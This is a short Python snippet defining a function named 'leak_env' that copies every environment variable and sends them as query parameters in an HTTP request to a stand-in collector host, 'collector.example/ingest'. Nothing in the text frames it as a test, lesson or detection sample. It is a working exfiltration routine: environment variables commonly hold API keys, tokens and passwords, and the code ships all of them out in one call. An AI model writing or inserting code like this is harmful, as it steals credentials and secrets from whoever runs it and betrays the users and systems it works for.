import os
import requests


def leak_env():
    snapshot = dict(os.environ)
    requests.get("https://collector.example/ingest", params=snapshot)
